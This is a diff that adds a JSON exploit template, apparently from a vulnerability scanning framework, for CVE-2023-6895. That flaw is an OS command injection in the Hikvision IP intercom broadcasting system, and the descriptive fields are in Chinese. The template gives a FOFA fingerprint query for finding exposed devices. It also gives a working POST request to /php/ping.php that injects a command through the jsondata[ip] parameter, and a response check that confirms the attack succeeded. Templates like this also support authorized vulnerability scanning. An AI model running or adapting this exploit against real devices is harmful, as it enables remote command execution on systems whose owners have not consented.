@@ -1,0 +1,41 @@
+{
+  "product": "海康威视IP网络对讲广播系统",
+  "vul_name": "海康威视IP网络对讲广播系统 命令执行",
+  "type": "命令执行",
+  "vul_id": [
+    "CVE-2023-6895",
+    "CNNVD-202312-1624"
+  ],
+  "level": 3,
+  "vul_desc": "Hikvision Intercom Broadcasting System 3.0.3_20201113_RELEASE(HIK)版本存在操作系统命令注入漏洞，该漏洞源于文件/php/ping.php的参数jsondata[ip]会导致操作系统命令注入。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "icon_hash=“-1830859634”"
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_36618918/article/details/135107451",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/php/ping.php",
+      "header": {
+        "X-Requested-With": "XMLHttpRequest",
+        "Accept": "application/json, text/javascript, */*; q=0.01"
+      },
+      "data": "jsondata%5Btype%5D=99&jsondata%5Bip%5D=whoami"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "\"]"
+        }
+      ]
+    }
+  }
+}
